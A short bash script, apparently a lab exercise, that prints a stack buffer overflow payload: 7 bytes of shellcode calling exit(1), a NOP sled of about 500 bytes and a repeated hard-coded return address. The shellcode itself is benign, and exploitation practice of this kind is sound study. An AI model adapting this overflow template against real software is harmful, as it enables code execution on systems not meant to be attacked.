#!/bin/bash

#http://shell-storm.org/shellcode/files/shellcode-55.php
#7 bytes
#exit(1)

echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80"

for i in $(seq 8 508)
do
   echo -ne "\x90"
done

for i in 1 2
do
    echo -ne "\x1c\xd4\xff\xff"
done